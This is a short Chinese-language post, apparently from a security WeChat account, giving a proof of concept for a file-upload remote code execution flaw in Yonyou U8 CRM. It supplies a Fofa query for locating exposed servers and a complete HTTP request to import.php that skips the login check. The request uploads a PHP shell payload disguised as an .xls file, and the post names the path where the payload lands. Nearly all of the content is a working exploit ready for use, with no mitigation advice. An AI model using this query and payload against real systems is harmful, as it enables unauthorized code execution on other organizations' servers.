#  用友U8 CRM 文件上传致RCE漏洞   
合规渗透  合规渗透   2024-07-21 15:34  
  
## Fofa语法  
  
title="  
用友  
U8CRM"  
  
## 漏洞POC  
```
POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
 
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="xfile"; filename="1.xls"
 
<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="combo"
 
rce.php
------WebKitFormBoundarye0z8QbHs79gL8vW5--

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj5bcK0Gmjae40EDYEbypQn3OIeGOGqL5URuV1ttfWgf88jpeibXr6ibH9Cv5fhQaBzqIE2xNPDcey5w/640?wx_fmt=png&from=appmsg "")  
  
上传定位  
/tmpfile/rce.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj5bcK0Gmjae40EDYEbypQn3BguRArYDKHHJOGL9tpmAWtxPReXjiceibvla2TW9cNw54XRiaQH8pW5Nw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
